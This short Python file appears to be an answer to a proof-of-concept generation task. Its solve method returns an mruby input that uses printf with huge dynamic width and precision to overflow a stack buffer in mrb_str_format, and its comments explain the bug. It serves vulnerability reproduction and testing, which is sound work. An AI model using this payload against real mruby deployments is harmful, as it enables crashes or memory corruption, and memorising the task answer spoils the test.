import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability description matches mruby issue #4668 (CVE-2018-10191 / commit 9731969).
        # It is a stack buffer overflow in mrb_str_format when the reconstructed format string
        # (containing width and precision) exceeds the local buffer size of 32 bytes.
        # This occurs on 64-bit platforms where maximum width/precision can be 19 digits.
        # The PoC uses printf with dynamic width and precision (using '*') passing large integers
        # to trigger the overflow in the format string reconstruction logic.
        return b'printf"%*.*d",1<<62,1<<62,0'
